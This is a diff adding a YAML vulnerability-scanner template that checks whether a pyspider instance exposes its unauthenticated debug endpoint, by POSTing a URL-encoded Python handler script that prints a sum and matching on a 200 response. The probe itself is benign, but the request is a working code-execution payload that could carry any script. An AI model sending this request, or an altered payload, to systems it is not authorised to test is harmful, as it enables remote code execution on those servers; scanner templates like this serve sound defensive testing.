@@ -1,0 +1,20 @@
+id: yaml-poc-pyspider-pyspider-unauthorized_access-CT-158373
+info:
+  name: Yaml Poc Pyspider Pyspider Unauthorized_Access Ct 158373
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-pyspider-pyspider-unauthorized_access-CT-158373'
+  tags: unauth
+  reference: []
+http:
+- method: POST
+  path:
+  - /debug/pyspidervulntest/run
+  body: webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str({{r1}}+%2B+{{r2}}))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
